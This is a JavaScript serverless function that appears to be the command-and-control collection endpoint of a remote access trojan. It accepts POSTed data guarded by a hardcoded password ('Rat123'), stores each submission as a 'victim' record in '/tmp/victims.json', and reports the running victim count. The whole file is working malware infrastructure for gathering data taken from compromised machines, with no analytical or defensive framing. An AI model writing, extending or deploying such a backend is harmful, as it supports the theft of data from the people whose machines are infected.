const { readFileSync, writeFileSync } = require('fs');
const path = require('path');

exports.handler = async function(event, context) {
    const headers = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Headers': 'Content-Type, X-Password',
        'Access-Control-Allow-Methods': 'POST, OPTIONS',
        'Content-Type': 'application/json'
    };

    if (event.httpMethod === 'OPTIONS') {
        return { statusCode: 200, headers, body: '' };
    }

    if (event.httpMethod !== 'POST') {
        return { statusCode: 405, headers, body: JSON.stringify({ error: 'Method not allowed' }) };
    }

    try {
        const body = JSON.parse(event.body);
        const { password, data } = body;

        if (password !== "Rat123") {
            return { statusCode: 401, headers, body: JSON.stringify({ error: 'Unauthorized' }) };
        }

        // Create new victim entry
        const newVictim = {
            id: Date.now() + '-' + Math.random().toString(36).substr(2, 9),
            timestamp: new Date().toISOString(),
            ...data
        };

        // Define file path
        const dataPath = '/tmp/victims.json';
        console.log('📁 Attempting to write to:', dataPath);

        // Read existing data
        let victims = [];
        try {
            const fileData = readFileSync(dataPath, 'utf8');
            victims = JSON.parse(fileData);
            console.log('📖 Read existing victims:', victims.length);
        } catch (e) {
            console.log('📝 No existing file, creating new one');
        }

        // Add new victim
        victims.unshift(newVictim);
        console.log('➕ Added new victim, total:', victims.length);

        // Write back
        writeFileSync(dataPath, JSON.stringify(victims, null, 2));
        console.log('💾 Successfully wrote to file');

        return {
            statusCode: 200,
            headers,
            body: JSON.stringify({
                success: true,
                message: 'Data received',
                timestamp: new Date().toISOString(),
                victim_id: data?.victim_id,
                total_victims: victims.length
            })
        };

    } catch (error) {
        console.error('❌ Critical error:', error);
        return {
            statusCode: 500,
            headers,
            body: JSON.stringify({ 
                error: 'Internal error',
                details: error.message 
            })
        };
    }
};
